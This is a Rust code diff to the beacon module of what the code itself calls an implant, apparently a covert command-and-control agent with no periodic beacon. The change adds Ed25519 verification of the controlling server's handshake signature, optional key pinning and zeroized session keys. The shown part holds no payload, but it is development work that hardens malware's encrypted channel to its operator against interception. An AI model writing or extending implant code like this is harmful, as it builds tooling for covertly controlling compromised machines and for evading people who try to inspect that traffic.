@@ -1,10 +1,12 @@
 use crate::crypto::{self, EphemeralKeys, KEY_SIZE};
 use crate::transport::{self, Transport, TransportResult};
 use crate::ImplantConfig;
+use ed25519_dalek::{Signature, Verifier, VerifyingKey};
 use rand::Rng;
 use std::sync::Arc;
 use tokio::sync::Mutex;
 use tokio::time::{sleep, Duration};
+use zeroize::Zeroizing;
 
 /// The beacon manages the implant's lifecycle. It is event-driven:
 /// there is no periodic beacon — the implant only communicates when
@@ -12,7 +14,7 @@ use tokio::time::{sleep, Duration};
 pub struct Beacon {
     config: ImplantConfig,
     transport: Box<dyn Transport>,
-    session_key: Arc<Mutex<Option<[u8; KEY_SIZE]>>>,
+    session_key: Arc<Mutex<Option<Zeroizing<[u8; KEY_SIZE]>>>>,
     seq: Arc<Mutex<u64>>,
     keys: Arc<Mutex<EphemeralKeys>>,
 }
@@ -111,14 +113,65 @@ impl Beacon {
             return Err("server public key mismatch — possible MITM".into());
         }
 
-        let server_pub = x25519_dalek::PublicKey::from(server_pubkey_arr);
-        let shared = crypto::compute_shared(&keys.secret, &server_pub);
+        // Ed25519 mutual authentication: verify server's handshake signature
         let session_id = response
             .get("session_id")
             .and_then(|v| v.as_str())
-            .unwrap_or("0000000000000000")
-            .as_bytes();
-        let session_key = crypto::derive_session_key(&shared, session_id, b"dagger-session-v1");
+            .ok_or("server did not provide session_id")?;
+
+        let sig_hex = response
+            .get("signature")
+            .and_then(|v| v.as_str())
+            .ok_or("server did not provide handshake signature")?;
+        let sig_bytes = hex::decode(sig_hex)
+            .map_err(|e| format!("invalid signature hex: {e}"))?;
+        if sig_bytes.len() != ed25519_dalek::SIGNATURE_LENGTH {
+            return Err(format!(
+                "invalid signature length: {} (expected {})",
+                sig_bytes.len(),
+                ed25519_dalek::SIGNATURE_LENGTH
+            ).into());
+        }
+        let signature = Signature::from_slice(&sig_bytes)
+            .map_err(|e| format!("invalid signature: {e}"))?;
+
+        let ed25519_pubkey_hex = response
+            .get("ed25519_pubkey")
+            .and_then(|v| v.as_str())
+            .ok_or("server did not provide ed25519 public key")?;
+        let ed25519_pubkey_bytes = hex::decode(ed25519_pubkey_hex)
+            .map_err(|e| format!("invalid ed25519 public key hex: {e}"))?;
+        if ed25519_pubkey_bytes.len() != ed25519_dalek::PUBLIC_KEY_LENGTH {
+            return Err(format!(
+                "invalid ed25519 public key length: {} (expected {})",
+                ed25519_pubkey_bytes.len(),
+                ed25519_dalek::PUBLIC_KEY_LENGTH
+            ).into());
+        }
+        let mut ed25519_pubkey_arr = [0u8; ed25519_dalek::PUBLIC_KEY_LENGTH];
+        ed25519_pubkey_arr.copy_from_slice(&ed25519_pubkey_bytes);
+
+        // Optional key pinning: if configured, the server's Ed25519 key must match
+        if self.config.server_ed25519_pubkey != [0u8; ed25519_dalek::PUBLIC_KEY_LENGTH]
+            && ed25519_pubkey_arr != self.config.server_ed25519_pubkey
+        {
+            return Err("server ed25519 public key mismatch — possible MITM".into());
+        }
+
+        // Verify signature over (server_x25519_pubkey || session_id || server_ed25519_pubkey)
+        let verifying_key = VerifyingKey::from_bytes(&ed25519_pubkey_arr)
+            .map_err(|e| format!("invalid server ed25519 public key: {e}"))?;
+        let mut sig_blob: Vec<u8> = Vec::with_capacity(32 + session_id.len() + 32);
+        sig_blob.extend_from_slice(&server_pubkey_arr);
+        sig_blob.extend_from_slice(session_id.as_bytes());
+        sig_blob.extend_from_slice(&ed25519_pubkey_arr);
+        verifying_key
+            .verify(&sig_blob, &signature)
+            .map_err(|_| "server signature verification failed — possible MITM")?;
+
+        let server_pub = x25519_dalek::PublicKey::from(server_pubkey_arr);
+        let shared = crypto::compute_shared(&keys.secret, &server_pub);
+        let session_key = crypto::derive_session_key(&shared, session_id.as_bytes(), b"dagger-session-v1");
 
         let mut sk = self.session_key.lock().await;
         *sk = Some(session_key);
